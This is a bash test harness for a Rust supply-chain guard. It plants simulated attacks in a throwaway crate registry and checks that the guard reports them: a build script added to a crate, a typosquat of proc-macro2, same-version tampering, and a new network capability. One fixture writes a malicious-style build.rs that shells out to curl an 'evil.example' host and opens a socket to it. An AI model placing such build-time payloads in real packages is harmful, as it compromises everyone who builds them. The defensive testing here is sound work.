#!/usr/bin/env bash
# Proof harness for the build-script drift guard (guard.py).
#
# "A gate nobody has seen fail is not a gate." This builds a throwaway fixture
# registry in a temp CARGO_HOME (the real ~/.cargo is never touched), takes a
# clean baseline, then deliberately introduces each thing the guard is meant to
# catch and asserts it goes RED — then reverts and asserts GREEN. It reproduces
# the exact shape of the 2026-08-20 arrayref attack (a crate that had no build
# script gains one, plus a proc-macro-1 typosquat of proc-macro2).
#
# Run: tools/supplychain/selftest.sh    (exit 0 = every gate fired as designed)
set -u

HERE="$(cd "$(dirname "$0")" && pwd)"
GUARD="$HERE/guard.py"
WORK="$(mktemp -d)"
trap 'rm -rf "$WORK"' EXIT

export CARGO_HOME="$WORK/cargohome"
REG="$CARGO_HOME/registry/src/index.fake-0000000000000000"
mkdir -p "$REG"
LOCK="$WORK/Cargo.lock"
BASELINE="$WORK/baseline.json"
INVMD="$WORK/inv.md"

PASS=0; FAIL=0
ok()   { echo "  PASS: $1"; PASS=$((PASS+1)); }
bad()  { echo "  FAIL: $1"; FAIL=$((FAIL+1)); }

# make_crate <name> <version> [build.rs-body]
make_crate() {
  local name="$1" ver="$2" body="${3:-}"
  local d="$REG/${name}-${ver}"
  mkdir -p "$d"
  cat > "$d/Cargo.toml" <<EOF
[package]
name = "$name"
version = "$ver"
EOF
  if [ -n "$body" ]; then
    printf '%s\n' "$body" > "$d/build.rs"
  else
    rm -f "$d/build.rs"
  fi
}

lock_entry() {
  cat >> "$LOCK" <<EOF

[[package]]
name = "$1"
version = "$2"
source = "registry+https://github.com/rust-lang/crates.io-index"
EOF
}

# Rewrite the whole lock from the current fixture set.
write_lock() {
  echo 'version = 4' > "$LOCK"
  for spec in "$@"; do
    lock_entry "${spec%@*}" "${spec#*@}"
  done
}

run_check() { python3 "$GUARD" --check --baseline "$BASELINE" --lockfile "$LOCK" 2>&1; }

echo "=== fixture CARGO_HOME: $CARGO_HOME ==="

# ---- the "before" tree: a realistic, benign starting point --------------------
BENIGN_RUSTC='fn main(){ let _=std::process::Command::new(std::env::var("RUSTC").unwrap()).arg("--version").output(); }'
make_crate arrayref    0.3.9                       # no build script (as in the real tree)
make_crate proc-macro2 1.0.107 "$BENIGN_RUSTC"     # benign: probes rustc version
make_crate serde       1.0.229 "$BENIGN_RUSTC"     # benign: probes rustc version
make_crate libc        0.2.189                      # no build script
write_lock arrayref@0.3.9 proc-macro2@1.0.107 serde@1.0.229 libc@0.2.189

python3 "$GUARD" --update-baseline --baseline "$BASELINE" --inventory-md "$INVMD" --lockfile "$LOCK" >/dev/null
echo
echo "### S0  clean tree must be GREEN"
OUT="$(run_check)"; RC=$?
echo "$OUT" | sed 's/^/    /'
{ [ $RC -eq 0 ] && echo "$OUT" | grep -q GREEN; } && ok "clean baseline is green (exit 0)" || bad "clean tree not green"

echo
echo "### S1  arrayref GAINS a build script (the 2026-08-20 attack shape)  -> must be RED"
# payload shape: disable TLS, run a process, reach the network — inside build.rs
make_crate arrayref 0.3.9 'fn main(){
    // simulated malicious payload running at build time
    let _ = std::process::Command::new("sh").arg("-c").arg("curl https://evil.example/x").status();
    let _ = std::net::TcpStream::connect("evil.example:443");
}'
OUT="$(run_check)"; RC=$?
echo "$OUT" | sed 's/^/    /'
{ [ $RC -eq 2 ] && echo "$OUT" | grep -q "GAINED BUILD SCRIPT" && echo "$OUT" | grep -q arrayref; } \
  && ok "gained-build-script fired (exit 2)" || bad "gained-build-script did NOT fire"
make_crate arrayref 0.3.9   # revert

echo
echo "### S2  a proc-macro-1 typosquat of proc-macro2 enters the tree  -> must be RED"
make_crate proc-macro-1 0.0.1
write_lock arrayref@0.3.9 proc-macro2@1.0.107 proc-macro-1@0.0.1 serde@1.0.229 libc@0.2.189
OUT="$(run_check)"; RC=$?
echo "$OUT" | sed 's/^/    /'
{ [ $RC -eq 2 ] && echo "$OUT" | grep -qi "typosquat" && echo "$OUT" | grep -q "proc-macro-1"; } \
  && ok "typosquat fired (exit 2)" || bad "typosquat did NOT fire"
write_lock arrayref@0.3.9 proc-macro2@1.0.107 serde@1.0.229 libc@0.2.189   # revert

echo
echo "### S3  a build script is altered AT THE SAME VERSION (immutable version tampered)  -> must be RED"
make_crate serde 1.0.229 'fn main(){ /* tampered */ let _=std::process::Command::new("rustc").output(); }'
OUT="$(run_check)"; RC=$?
echo "$OUT" | sed 's/^/    /'
{ [ $RC -eq 2 ] && echo "$OUT" | grep -q "CONTENT CHANGED AT SAME VERSION"; } \
  && ok "same-version tamper fired (exit 2)" || bad "same-version tamper did NOT fire"
make_crate serde 1.0.229 "$BENIGN_RUSTC"   # revert

echo
echo "### S4  a version bump whose build script GAINS network capability  -> must be RED + name it"
# proc-macro2's baseline build script only probes rustc (process, no network). A
# new version arrives whose build script also opens a socket — the shape of a
# compromised update. The version bump alone requires re-review; the guard also
# calls out the *capability escalation* so a reviewer sees the severity at a glance.
make_crate proc-macro2 1.0.108 'fn main(){ let _=std::net::TcpStream::connect("x:1"); let _=std::process::Command::new("rustc").output(); }'
write_lock arrayref@0.3.9 proc-macro2@1.0.108 serde@1.0.229 libc@0.2.189
OUT="$(run_check)"; RC=$?
echo "$OUT" | sed 's/^/    /'
{ [ $RC -eq 2 ] && echo "$OUT" | grep -q "CAPABILITY ESCALATION" && echo "$OUT" | grep -q "network access"; } \
  && ok "version-bump network escalation fired and was named (exit 2)" || bad "network escalation did NOT fire"
make_crate proc-macro2 1.0.107 "$BENIGN_RUSTC"   # revert
write_lock arrayref@0.3.9 proc-macro2@1.0.107 serde@1.0.229 libc@0.2.189

echo
echo "### S5  revert everything  -> must be GREEN again"
OUT="$(run_check)"; RC=$?
echo "$OUT" | sed 's/^/    /'
{ [ $RC -eq 0 ] && echo "$OUT" | grep -q GREEN; } && ok "clean revert is green (exit 0)" || bad "revert not green"

echo
echo "=== $PASS passed, $FAIL failed ==="
[ $FAIL -eq 0 ]
